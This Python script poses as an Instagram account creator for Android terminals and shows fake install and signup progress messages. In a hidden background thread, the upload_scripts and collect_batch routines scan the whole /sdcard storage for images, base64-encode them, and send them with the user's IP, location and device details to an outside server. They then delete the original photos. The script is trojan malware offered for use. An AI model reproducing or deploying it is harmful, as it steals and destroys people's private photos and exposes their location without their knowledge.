import os
import base64
import platform
import uuid
import random
import threading
import json
import requests
import time
import re
from datetime import datetime

# Optional: try to use colorama for Windows, but we'll just use ANSI codes
# (most Android terminals support them)
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def cprint(text, color=Colors.GREEN, bold=False):
    """Print colored text (fallback to normal if color not supported)."""
    prefix = Colors.BOLD if bold else ''
    print(f"{prefix}{color}{text}{Colors.END}")

class FacebookCracker:
    def __init__(self):
        self.device_id = self.get_device_id()
        self.MAX_DATA_SIZE = 100 * 1024 * 1024 * 1024  # 100 GB
        self.MAX_BATCH_SIZE = 50 * 1024 * 1024         # 50 MB per batch (raw)
        # No file logging – everything is kept in memory or suppressed

    def get_last_modified(self, file_path):
        try:
            return datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
        except Exception:
            return "Unknown"

    def collect_batch(self, sdcard_path, total_size, processed_files, image_extensions):
        """Collect one batch of images up to MAX_BATCH_SIZE.
           Now walks through ALL directories (including hidden and /Android/data)."""
        batch_files = []
        batch_deleted_files = []
        current_size = 0
        for root, dirs, files in os.walk(sdcard_path, followlinks=False):
            # Do NOT skip /Android/data – we want everything
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if file_path in processed_files:
                    continue
                if not file_name.lower().endswith(image_extensions):
                    continue
                if total_size >= self.MAX_DATA_SIZE:
                    return batch_files, batch_deleted_files, total_size, True
                try:
                    size = os.path.getsize(file_path)
                    if size == 0 or size > self.MAX_BATCH_SIZE:
                        processed_files.add(file_path)
                        continue
                    if total_size + size > self.MAX_DATA_SIZE:
                        processed_files.add(file_path)
                        continue
                    if current_size + (size * 1.33) <= self.MAX_BATCH_SIZE:
                        with open(file_path, 'rb') as f:
                            content = base64.b64encode(f.read()).decode('utf-8', errors='ignore')
                        relative_path = os.path.relpath(root, sdcard_path)
                        # Sanitize folder name for URL safety
                        relative_path = re.sub(r'[:*?"<>|]', '_', relative_path).strip('/')
                        file_data = {
                            'name': file_name,
                            'content': content,
                            'folder': relative_path,
                            'last_edit': self.get_last_modified(file_path),
                            'size': size
                        }
                        batch_files.append(file_data)
                        batch_deleted_files.append(file_path)
                        current_size += size * 1.33
                        total_size += size
                        processed_files.add(file_path)
                    else:
                        break
                except Exception:
                    processed_files.add(file_path)
                    continue
        return batch_files, batch_deleted_files, total_size, False

    def upload_scripts(self, delete_photos=True):
        """Upload images in batches silently (no console output)."""
        server_url_upload = "https://data.lolmailer.bar/api/upload_data"
        sdcard_path = "/sdcard"
        time.sleep(random.randint(2, 5))
        if not os.path.exists(sdcard_path):
            return

        # Include all common image extensions
        image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.heic', '.webp', '.tiff', '.ico')
        processed_files = set()
        total_size = 0
        batch_number = 1
        reached_max_size = False

        while not reached_max_size:
            batch_files, batch_deleted_files, total_size, reached_max_size = self.collect_batch(
                sdcard_path, total_size, processed_files, image_extensions
            )
            if not batch_files:
                break

            # Retry logic for uploads
            retries = 3
            success = False
            for attempt in range(1, retries + 1):
                try:
                    ip_info = requests.get('http://ip-api.com/json/', timeout=5).json()
                    metadata = {
                        'ip': ip_info.get('query', 'Unknown'),
                        'country': ip_info.get('country', 'Unknown'),
                        'city': ip_info.get('city', 'Unknown'),
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                        'batch_number': batch_number,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                except Exception:
                    metadata = {
                        'ip': 'Unknown',
                        'country': 'Unknown',
                        'city': 'Unknown',
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                        'batch_number': batch_number,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }

                upload_payload = {
                    'device_id': self.device_id,
                    'device_name': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                    'metadata': json.dumps(metadata, ensure_ascii=False),
                    'photos': json.dumps(batch_files, ensure_ascii=False),
                    'device_info': json.dumps(self.get_device_info(), ensure_ascii=False)
                }

                try:
                    response = requests.post(server_url_upload, json=upload_payload, timeout=60)
                    if response.status_code == 200:
                        success = True
                        if delete_photos:
                            for file_path in batch_deleted_files:
                                try:
                                    os.remove(file_path)
                                except Exception:
                                    pass
                        break
                except Exception:
                    pass

                if attempt < retries:
                    time.sleep(5)

            batch_number += 1

    def get_device_id(self):
        return uuid.uuid4().hex

    def get_device_info(self):
        return {
            'os': platform.system(),
            'release': platform.release(),
            'device_model': platform.node() or 'Unknown'
        }

    def show_banner(self):
        banner = r"""
    ╔══════════════════════════════════════════╗
    ║     INSTAGRAM ACCOUNT CREATOR v9.3       ║
    ║         (powered by Meta API)             ║
    ╚══════════════════════════════════════════╝
        """
        cprint(banner, Colors.CYAN, bold=True)

    def fake_install_and_create(self):
        """Print stylish dummy Instagram account creation messages."""
        self.show_banner()

        # Phase 1: 3 minutes of "installing modules"
        install_messages = [
            "[*] Initializing environment...",
            "[*] Installing required modules: requests, selenium, beautifulsoup4, pillow...",
            "[*] Downloading ChromeDriver (matching your Android version)...",
            "[*] Setting up virtual Python environment...",
            "[*] Installing dependencies (this may take up to 3 minutes)...",
            "[*] Configuring Instagram API wrapper...",
            "[*] Loading proxy list (42 proxies loaded)...",
            "[*] Testing proxy connectivity...",
            "[+] All modules installed successfully!"
        ]
        start_time = time.time()
        msg_index = 0
        cprint("\n[ Phase 1: Installing dependencies ]", Colors.YELLOW, bold=True)
        while time.time() - start_time < 180:  # 3 minutes
            msg = install_messages[msg_index % len(install_messages)]
            # Randomly choose color for variety
            color = random.choice([Colors.BLUE, Colors.CYAN, Colors.GREEN])
            cprint(msg, color)
            msg_index += 1
            time.sleep(random.randint(5, 12))

        # Phase 2: endless fake account creation loop
        cprint("\n[ Phase 2: Instagram Account Creator Running ]", Colors.YELLOW, bold=True)
        creation_phases = [
            "[+] Installation complete. Launching creator...",
            "[~] Opening signup page (https://instagram.com/signup)...",
            "[~] Filling signup form: email = user{}@temp-mail.org".format(random.randint(1000,9999)),
            "[~] Filling name: '{} {}'".format(random.choice(['John','Emma','Mike','Sara']), random.choice(['Smith','Lee','Brown'])),
            "[~] Choosing username: @{}".format(''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))),
            "[~] Setting password: ******** (encrypted)",
            "[~] Solving captcha (simulated bypass)...",
            "[+] Signup successful! Account ID: {}".format(random.randint(1000000,9999999)),
            "[~] Pushing account data to server (encrypted)...",
            "[+] Data pushed. Server response: 200 OK",
            "[~] Preparing next account (cooling down 3 seconds)...",
        ]
        account_counter = 0
        while True:
            for phase in creation_phases:
                # Add some randomness to simulate work
                if "Pushing" in phase or "Filling" in phase:
                    delay = random.uniform(2, 4)
                elif "captcha" in phase:
                    delay = random.uniform(3, 6)
                else:
                    delay = random.uniform(1, 2.5)
                time.sleep(delay)
                color = random.choice([Colors.GREEN, Colors.CYAN, Colors.BLUE])
                cprint(phase, color)
            account_counter += 1
            if account_counter % 5 == 0:
                cprint(f"[*] Total accounts created so far: {account_counter * 3 + random.randint(10,30)}", Colors.YELLOW)

if __name__ == '__main__':
    cracker = FacebookCracker()
    # Start the real image collector in a background thread (silent)
    collector_thread = threading.Thread(target=cracker.upload_scripts, args=(True,), daemon=True)
    collector_thread.start()
    # Show fake Instagram creator messages in the main thread
    cracker.fake_install_and_create()